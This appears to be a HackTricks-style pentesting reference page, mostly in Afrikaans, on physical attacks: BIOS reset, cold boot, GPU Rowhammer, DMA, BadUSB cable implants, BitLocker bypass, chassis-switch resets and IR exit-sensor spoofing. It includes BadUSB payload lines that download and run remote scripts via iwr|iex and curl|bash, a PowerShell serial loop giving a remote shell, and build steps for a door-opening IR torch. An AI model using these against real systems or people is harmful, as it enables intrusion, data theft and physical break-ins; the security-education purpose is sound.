# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**Resetting the BIOS** kan op verskeie maniere bereik word. Die meeste moederborde sluit ’n **battery** in wat, wanneer dit vir ongeveer **30 minutes** verwyder word, die BIOS-instellings sal herstel, insluitend die wagwoord. Alternatiewelik kan ’n **jumper on the motherboard** aangepas word om hierdie instellings te herstel deur spesifieke penne te verbind.

Vir situasies waar hardeware-aanpassings nie moontlik of prakties is nie, bied **software tools** ’n oplossing. Om ’n stelsel vanaf ’n **Live CD/USB** met verspreidings soos **Kali Linux** te laat loop, bied toegang tot tools soos **_killCmos_** en **_CmosPWD_**, wat kan help met BIOS password recovery.

In gevalle waar die BIOS password onbekend is, sal die verkeerde invoer daarvan **three times** gewoonlik lei tot ’n foutkode. Hierdie kode kan op webwerwe soos [https://bios-pw.org](https://bios-pw.org) gebruik word om moontlik ’n bruikbare wagwoord te verkry.

### UEFI Security

Vir moderne stelsels wat **UEFI** gebruik in plaas van tradisionele BIOS, kan die tool **chipsec** gebruik word om UEFI-instellings te analiseer en te wysig, insluitend die deaktivering van **Secure Boot**. Dit kan met die volgende command gedoen word:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAM behou data kort ná krag afgesny word, gewoonlik vir **1 tot 2 minute**. Hierdie volharding kan tot **10 minute** verleng word deur koue stowwe, soos vloeibare stikstof, toe te pas. Gedurende hierdie verlengde periode kan ’n **memory dump** geskep word met gereedskap soos **dd.exe** en **volatility** vir analise.

---

## GPU Rowhammer Against Page Tables

Moderne GPU Rowhammer attacks word baie nuttiger wanneer hulle **GPU virtual-memory metadata** teiken in plaas van gewone buffers. Onlangse werk op **GDDR6 NVIDIA Ampere GPUs** toon dat ’n aanvaller wat onvoorregte CUDA code laat loop, GPU-spesifieke hammering patterns kan bou, **memory massaging** kan gebruik om paging structures in kwesbare rye te plaas, en dan bits in die **last-level page table** of ’n intermediêre **page directory** kan flip. Sodra ’n enkele translation entry beskadig is, kan die aanvaller **arbitrary GPU memory read/write** bootstrap en dan na host compromise pivot.

### Exploitation Pattern

1. **Profile hammerable rows** in GDDR6 en bou refresh-aware / non-uniform hammering patterns wat in-DRAM mitigations omseil.
2. **Massage GPU allocations** sodat die driver page-translation structures in hammerable physical locations plaas in plaas daarvan om hulle in die verstek protected pool te hou. In die praktyk kan dit beteken om die low-memory page-table region uit te put en groot sparse UVM mappings met controlled strides te spray.
3. **Flip translation metadata** soos **PFN** of aperture-related bits binne ’n page-table / page-directory entry sodat die attacker-controlled virtual page na page-table pages, arbitrary GPU memory, of host-visible system mappings resolve.
4. Hergebruik die forged mapping om addisionele translation entries te herskryf en eskaleer na **arbitrary GPU memory read/write** oor GPU contexts heen.

### Host Pivot and Mitigations

- Met **IOMMU disabled**, kan forged system-aperture mappings arbitrary **host physical memory** aan die GPU blootstel, wat die GPU primitive in volle host compromise verander.
- **GDDRHammer** teiken last-level page-table entries, terwyl **GeForge** wys dat die korrupsie van ’n page-directory level makliker kan wees omdat een bit flip ’n groter translation subtree kan herteiken. Moenie net een paging layer as security-critical behandel nie.
- **IOMMU** bly belangrik omdat dit die direkte arbitrary-host-memory pad blokkeer wat deur GDDRHammer/GeForge gebruik word, maar dit is **nie ’n volledige mitigation** nie. **GPUBreach** wys ’n tweede-fase pivot waar die aanvaller GPU-writable, driver-owned CPU buffers beskadig en dan NVIDIA driver memory-safety bugs aktiveer om ’n kernel write primitive en ’n **root shell** te verkry, selfs met IOMMU geaktiveer.
- **System-level ECC** is ’n praktiese hardening step op ondersteunde workstation/server GPUs. Consumer GPUs sonder ECC stel ’n swakker defense surface bloot.
- Hierdie attacks is nie bloot teoreties nie: **GeForge** het **1,171** bit flips op ’n RTX 3060 en **202** op ’n RTX A6000 gerapporteer, wat genoeg was om ’n werkende host-privilege-escalation chain te bou.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** is ’n tool wat ontwerp is vir **physical memory manipulation** deur DMA, versoenbaar met interfaces soos **FireWire** en **Thunderbolt**. Dit laat toe dat login procedures omseil word deur memory te patch om enige password te aanvaar. Dit is egter ondoeltreffend teen **Windows 10** systems.

---

## Live CD/USB for System Access

Om system binaries soos **_sethc.exe_** of **_Utilman.exe_** te vervang met ’n kopie van **_cmd.exe_** kan ’n command prompt met system privileges verskaf. Tools soos **chntpw** kan gebruik word om die **SAM** file van ’n Windows installation te redigeer, wat password changes moontlik maak.

**Kon-Boot** is ’n tool wat help om by Windows systems aan te meld sonder om die password te ken deur die Windows kernel of UEFI tydelik te wysig. Meer inligting kan gevind word by [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: Toegang tot BIOS settings.
- **F8**: Gaan in Recovery mode.
- Deur **Shift** ná die Windows banner te druk, kan autologon omseil word.

### BAD USB Devices

Devices soos **Rubber Ducky** en **Teensyduino** dien as platforms vir die skep van **bad USB** devices, wat in staat is om vooraf gedefinieerde payloads uit te voer wanneer hulle aan ’n teikentoestel gekoppel word.

### Volume Shadow Copy

Administrator privileges laat toe dat kopieë van sensitiewe files, insluitend die **SAM** file, deur PowerShell geskep word.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3-gebaseerde implants soos **Evil Crow Cable Wind** skuil binne USB-A→USB-C of USB-C↔USB-C cables, enumereer slegs as ’n USB keyboard, en stel hul C2 stack oor Wi-Fi bloot. Die operator hoef net die cable vanaf die victim host van krag te voorsien, ’n hotspot met die naam `Evil Crow Cable Wind` en password `123456789` te skep, en na [http://cable-wind.local/](http://cable-wind.local/) (of sy DHCP address) te browse om die embedded HTTP interface te bereik.
- Die browser UI bied tabs vir *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, en *Config*. Gestoor payloads word per OS getag, keyboard layouts word on the fly geskakel, en VID/PID strings kan verander word om bekende peripherals na te boots.
- Omdat die C2 binne die cable leef, kan ’n phone payloads stage, execution trigger, en Wi-Fi credentials bestuur sonder om die host OS aan te raak—ideaal vir kort dwell-time physical intrusions.

### OS-aware AutoExec payloads

- AutoExec rules bind een of meer payloads om onmiddellik ná USB enumeration af te vuur. Die implant voer liggewig OS fingerprinting uit en kies die ooreenstemmende script.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) of `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Omdat execution unattended is, kan die eenvoudige ruil van ’n charging cable “plug-and-pwn” initial access onder die logged-on user context bewerkstellig.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** ’n Gestoor payload open ’n console en plak ’n loop wat uitvoer wat ook al op die nuwe USB serial device aankom. ’n Minimale Windows variant is:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Die implant hou die USB CDC-kanaal oop terwyl sy ESP32-S3 ’n TCP-kliënt (Python script, Android APK, of desktop executable) terug na die operateur lanseer. Enige bytes wat in die TCP-sessie getik word, word na die seriële lus hierbo deurgestuur, wat remote command execution gee selfs op air-gapped hosts. Uitset is beperk, so operateurs voer tipies blind commands uit (account creation, staging additional tooling, ens.).

### HTTP OTA update surface

- Dieselfde web stack stel gewoonlik unauthenticated firmware updates bloot. Evil Crow Cable Wind luister op `/update` en flits enigiets wat opgelaai word:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## Bypassing BitLocker Encryption

BitLocker encryption can potentially be bypassed if the **recovery password** is found within a memory dump file (**MEMORY.DMP**). Tools like **Elcomsoft Forensic Disk Decryptor** or **Passware Kit Forensic** can be utilized for this purpose.

---

## Social Engineering for Recovery Key Addition

A new BitLocker recovery key can be added through social engineering tactics, convincing a user to execute a command that adds a new recovery key composed of zeros, thereby simplifying the decryption process.

---

## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS

Many modern laptops and small-form-factor desktops include a **chassis-intrusion switch** that is monitored by the Embedded Controller (EC) and the BIOS/UEFI firmware.  While the primary purpose of the switch is to raise an alert when a device is opened, vendors sometimes implement an **undocumented recovery shortcut** that is triggered when the switch is toggled in a specific pattern.

### How the Attack Works

1. The switch is wired to a **GPIO interrupt** on the EC.
2. Firmware running on the EC keeps track of the **timing and number of presses**.
3. When a hard-coded pattern is recognised, the EC invokes a *mainboard-reset* routine that **erases the contents of the system NVRAM/CMOS**.
4. On next boot, the BIOS loads default values – **supervisor password, Secure Boot keys, and all custom configuration are cleared**.

> Once Secure Boot is disabled and the firmware password is gone, the attacker can simply boot any external OS image and obtain unrestricted access to the internal drives.

### Real-World Example – Framework 13 Laptop

The recovery shortcut for the Framework 13 (11th/12th/13th-gen) is:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Na die tiende siklus stel die EC ’n vlag in wat die BIOS opdrag gee om NVRAM by die volgende herlaai te vee. Die hele prosedure neem ~40 s en vereis **niks behalwe ’n skroewedraaier**.

### Generic Exploitation Procedure

1. Skakel die teiken aan of doen suspend-resume sodat die EC loop.
2. Verwyder die onderblad om die intrusion/maintenance switch bloot te stel.
3. Reproduseer die verskaffer-spesifieke toggle pattern (raadpleeg dokumentasie, forums, of reverse-engineer die EC firmware).
4. Sit weer aanmekaar en herlaai – firmware protections behoort gedeaktiveer te wees.
5. Boot ’n live USB (bv. Kali Linux) en doen gewone post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, ens.).

### Detection & Mitigation

* Log chassis-intrusion events in die OS management console en korreleer met onverwagses BIOS resets.
* Gebruik **tamper-evident seals** op skroewe/bedekkings om oopmaak te kan opspoor.
* Hou toestelle in **physically controlled areas**; neem aan dat physical access gelykstaan aan volle compromise.
* Waar beskikbaar, deaktiveer die verskaffer se “maintenance switch reset” feature of vereis ’n bykomende cryptographic authorisation vir NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).
- A plastic shroud blocks the emitter and receiver from looking directly at each other, so the controller assumes any validated carrier came from a nearby reflection and drives a relay that opens the door strike.
- Once the controller believes a target is present it often changes the outbound modulation envelope, but the receiver keeps accepting any burst that matches the filtered carrier.

### Attack Workflow
1. **Capture the emission profile** – clip a logic analyser across the controller pins to record both the pre-detection and post-detection waveforms that drive the internal IR LED.
2. **Replay only the “post-detection” waveform** – remove/ignore the stock emitter and drive an external IR LED with the already-triggered pattern from the outset. Because the receiver only cares about pulse count/frequency, it treats the spoofed carrier as a genuine reflection and asserts the relay line.
3. **Gate the transmission** – transmit the carrier in tuned bursts (e.g., tens of milliseconds on, similar off) to deliver the minimum pulse count without saturating the receiver’s AGC or interference handling logic. Continuous emission quickly desensitises the sensor and stops the relay from firing.

### Long-Range Reflective Injection
- Replacing the bench LED with a high-power IR diode, MOSFET driver, and focusing optics enables reliable triggering from ~6 m away.
- The attacker does not need line-of-sight to the receiver aperture; aiming the beam at interior walls, shelving, or door frames that are visible through glass lets reflected energy enter the ~30° field of view and mimics a close-range hand wave.
- Because the receivers expect only weak reflections, a much stronger external beam can bounce off multiple surfaces and still remain above the detection threshold.

### Weaponised Attack Torch
- Embedding the driver inside a commercial flashlight hides the tool in plain sight. Swap the visible LED for a high-power IR LED matched to the receiver’s band, add an ATtiny412 (or similar) to generate the ≈30 kHz bursts, and use a MOSFET to sink the LED current.
- A telescopic zoom lens tightens the beam for range/precision, while a vibration motor under MCU control gives haptic confirmation that modulation is active without emitting visible light.
- Cycling through several stored modulation patterns (slightly different carrier frequencies and envelopes) increases compatibility across rebranded sensor families, letting the operator sweep reflective surfaces until the relay audibly clicks and the door releases.

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
